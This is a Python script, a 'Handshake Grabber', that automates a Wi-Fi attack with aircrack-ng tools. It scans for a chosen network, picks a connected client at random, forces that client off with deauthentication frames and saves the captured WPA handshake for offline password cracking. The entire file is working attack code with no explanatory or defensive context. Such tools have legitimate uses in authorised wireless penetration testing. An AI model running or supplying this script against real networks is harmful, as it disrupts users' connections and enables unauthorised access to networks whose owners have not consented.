import subprocess
import time
import datetime
import os
import random
import csv
from threading import Thread
import argparse
 
def find_client_mac(target_bssid, client_scan_file):
    out, _ = run_command(["grep", "-i", target_bssid, f"{client_scan_file}-01.csv"])
    clients = out.split('\n')[1:]  # exclude header
    clients = [i for i in clients if i]
    if not clients:
        return None
    selected_client = random.choice(clients)
    return selected_client.split(',')[0].strip()

def monitor_output(process):
    while True:
        output = process.stdout.readline()
        if process.poll() is not None:
            break
        if output:
            print(output.strip())
            if "WPA handshake".lower() in output.lower():
                print("Handshake captured. Killing airodump...")
                process.terminate()
                break

def run_command(command, wait=True):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if wait:
        out, err = process.communicate()
        return out, err
    return process

def is_ssid_found(target_ssid, scan_file):
    try:
        with open(scan_file, mode ='r') as f:   
            csvFile = csv.reader(f)
            for lines in csvFile:
                if len(lines)>1:
                    if lines[-2].strip()==target_ssid:
                        return True
    except FileNotFoundError:
        pass
    return False

def cleanup():
    # Cleanup
    cleanup_files = [
    f"{NETWORK_SCAN_FILE}-01.csv",
    f"{CLIENT_SCAN_FILE}-01.csv",
    f"{CLIENT_SCAN_FILE}-01.cap",
    f"{CLIENT_SCAN_FILE}-01.kismet.csv",
    f"{CLIENT_SCAN_FILE}-01.kismet.netxml",
    f"{TARGET_HANDSHAKE_FILE}-01.kismet.netxml",
    f"{TARGET_HANDSHAKE_FILE}-01.csv",
    f"{TARGET_HANDSHAKE_FILE}-01.kismet.csv",
    f"{TARGET_HANDSHAKE_FILE}-01.log.csv",

    ]
    print("Cleaning intermediary files...")
    for files in cleanup_files:
        if os.path.exists(files):
            try:
                os.remove(files)
                print("Removed",files)
            except FileNotFoundError:
                pass
                # print("File {} not found".format(files))

def main():
    global NETWORK_SCAN_FILE, CLIENT_SCAN_FILE,TARGET_HANDSHAKE_FILE
    if os.getuid() != 0:
        print("This script must be run as root.")
        return

    # Initialize the parser
    parser = argparse.ArgumentParser(description="Handshake Grabber")

    # Add the arguments
    parser.add_argument("-s", "--ssid", type=str, required=True, help="SSID of the target network.")
    parser.add_argument("-f", "--frequency", type=str, choices=['2G', '5G'], default='2G', help="Frequency of the network (2G or 5G). Default is 2G.")
    parser.add_argument("-i", "--interface", type=str, default="wlan0", help="Network interface to use. Default is wlan0.")
    parser.add_argument("-c", "--channels", type=str, help="Comma-separated list of channels to scan. E.g., '1,6,11' for 2G or '36,40,44' for 5G.")

    # Parse the arguments
    args = parser.parse_args()

    TARGET_SSID = args.ssid
    FREQUENCY = args.frequency
    INTERFACE = args.interface
    CHANNELS = []

    # Define available channels for 2G and 5G frequencies
    CHANNELS_2G = set([str(i) for i in range(1, 15)])  # 1 to 14
    CHANNELS_5G = set(['36', '40', '44', '48', '52', '56', '60', '64', '100', '104', '108', '112', '116', '120', '124', '128', '132',
                       '136', '140', '149', '153', '157', '161', '165'])

    if args.channels:
        CHANNELS = set(args.channels.split(','))
    elif not args.channels and FREQUENCY == "2G":
        CHANNELS = CHANNELS_2G
    elif not args.channels and FREQUENCY == "5G":
        CHANNELS = CHANNELS_5G

    

    # Check if provided channels match the specified frequency
    if FREQUENCY == '2G' and not CHANNELS.issubset(CHANNELS_2G):
        print("Error: Specified channels do not match the 2G frequency.")
        return
    elif FREQUENCY == '5G' and not CHANNELS.issubset(CHANNELS_5G):
        print("Error: Specified channels do not match the 5G frequency.")
        return

    print("Killing conflicting processes...")
    run_command(["airmon-ng", "check", "kill"])
    print("Setting interface to monitor mode...")
    run_command(["airmon-ng", "start", INTERFACE])

    SLEEP_TIME = 30


    TIMESTAMP = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    NETWORK_SCAN_FILE = f"networks_scan_{TIMESTAMP}"
    CLIENT_SCAN_FILE = f"client_scan_{TIMESTAMP}"
    TARGET_HANDSHAKE_FILE = f"target_handshake_{TIMESTAMP}"

    print("Starting scan on {} frequencies...".format(FREQUENCY))
    channels_str = ','.join(CHANNELS)
    process = run_command(["airodump-ng", INTERFACE, "--output-format", "csv", "-w", NETWORK_SCAN_FILE, "--channel", channels_str], wait=False)

    # Wait until SSID is found or timeout
    is_timeout=True
    end_time = time.time() + SLEEP_TIME
    while time.time() < end_time:
        if is_ssid_found(TARGET_SSID, f"{NETWORK_SCAN_FILE}-01.csv"):
            print("Found SSID ---> {}".format(TARGET_SSID))
            is_timeout=False
            process.terminate()
            break
        time.sleep(2)
    
    if is_timeout:
        print("Scanning timed out. Could not find SSID with name '{}' on the {} band!".format(TARGET_SSID,FREQUENCY))
        cleanup()
        return

    out, _ = run_command(["grep", "-i", TARGET_SSID, f"{NETWORK_SCAN_FILE}-01.csv"])
    TARGET_DETAILS = out.split('\n')[0]
    TARGET_BSSID = TARGET_DETAILS.split(',')[0].strip()
    TARGET_CHANNEL = TARGET_DETAILS.split(',')[3].strip()

    print("Discovering clients on network...")
    run_command(["airodump-ng", "-c", TARGET_CHANNEL, "--bssid", TARGET_BSSID, INTERFACE, "--output-format", "csv", "-w", CLIENT_SCAN_FILE], wait=False)
    time.sleep(10)
    print("Killing airodump...")
    run_command(["killall", "airodump-ng"])
    CLIENT_MAC = find_client_mac(TARGET_BSSID, CLIENT_SCAN_FILE)
    print("Random client MAC address:",CLIENT_MAC)

    if CLIENT_MAC:

        # Start capturing the handshake and wait until it's captured
        print("Starting listening for the handshake...")
        process = run_command(["airodump-ng", "-c", TARGET_CHANNEL, "--bssid", TARGET_BSSID, "-w", TARGET_HANDSHAKE_FILE, INTERFACE], wait=False)

        # Deauth the selected client
        print("Deauthenticating client from network....")
        Thread(target=run_command,args=(["aireplay-ng", "--deauth", "10", "-a", TARGET_BSSID, "-c", CLIENT_MAC, INTERFACE],False,)).start()

        # Monitor the output of airodump-ng for the handshake
        monitor_output(process)

        cleanup()

        print(f"Handshake saved to {TARGET_HANDSHAKE_FILE}-01.cap")
    else:
        print("No clients found associated with the BSSID.")

if __name__ == "__main__":
    main()

